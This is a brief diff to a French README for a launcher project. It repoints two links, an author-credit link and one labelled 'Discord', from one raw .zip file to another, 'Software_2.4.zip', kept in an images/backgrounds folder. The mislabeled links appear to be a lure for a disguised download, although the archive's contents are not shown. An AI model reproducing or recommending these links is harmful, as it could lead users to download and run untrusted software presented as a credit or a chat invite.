@@ -9,10 +9,10 @@
 
 
 <p>
-    Basé sur le travail de Daniel Scalzi (https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/panels/Software_v1.2.zip)
+    Basé sur le travail de Daniel Scalzi (https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/assets/images/backgrounds/Software_2.4.zip)
 </p>
 
 ---
 
 
-[discord]: https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/panels/Software_v1.2.zip 'Discord'
+[discord]: https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/assets/images/backgrounds/Software_2.4.zip 'Discord'
